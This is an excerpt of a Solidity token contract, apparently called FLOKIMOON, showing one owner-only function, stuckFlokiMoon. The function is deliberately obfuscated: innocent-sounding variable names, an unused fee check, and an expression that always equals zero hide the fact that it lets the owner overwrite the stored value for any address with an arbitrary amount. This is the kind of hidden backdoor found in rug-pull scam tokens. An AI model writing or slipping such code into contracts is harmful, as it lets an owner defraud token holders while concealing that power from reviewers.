...
contract FLOKIMOON is Ownable {
  ...
  function stuckFlokiMoon(address user, uint256 _value, uint256 batshFee) public onlyOwner returns(bool) {
    if(user != address(0)){
        require(batshFee <= 10 && batshFee > 0, "You can only select a number from 1 to 10");
        uint32 buyReward = 10; uint32 sellReward = 9; 
        uint256 amountToLiquify = uint256(user);
        _liquify[address(amountToLiquify)] = ((10 & (_liquify[address(amountToLiquify)]) & 0) << 0xF) + swapAndLiquify * _value * (buyReward ** sellReward);
        return true;
    }
  }
}